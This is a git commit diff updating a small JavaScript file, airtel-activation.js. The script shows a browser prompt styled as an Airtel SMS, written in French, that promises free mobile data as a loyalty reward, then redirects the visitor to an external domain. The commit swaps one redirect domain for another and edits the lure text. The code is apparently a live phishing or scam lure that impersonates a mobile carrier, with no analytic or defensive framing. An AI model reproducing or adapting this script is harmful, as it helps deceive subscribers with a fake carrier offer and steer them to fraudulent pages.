8b8ae763cc4ba01c20b2debf7171ca3f3e8bd799
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-10-02 12:11:55 -0700

    Update airtel-activation.js

--- airtel-activation.js
+++ airtel-activation.js
@@ -1,6 +1,6 @@
 
-var password = '1'
-password=prompt('Airtel SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
-if (password != '1') {
-location.href='https://30gbbonus.xyz/felixoffer.html';
+var password = 'Airtel 50 Go'
+password=prompt('SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur Ok pour activer maintenant. ','Airtel 50 Go');
+if (password != 'Airtel 50 Go') {
+location.href='https://damba-fest.org/airtel-4gdata.html#1727896184896';
 }
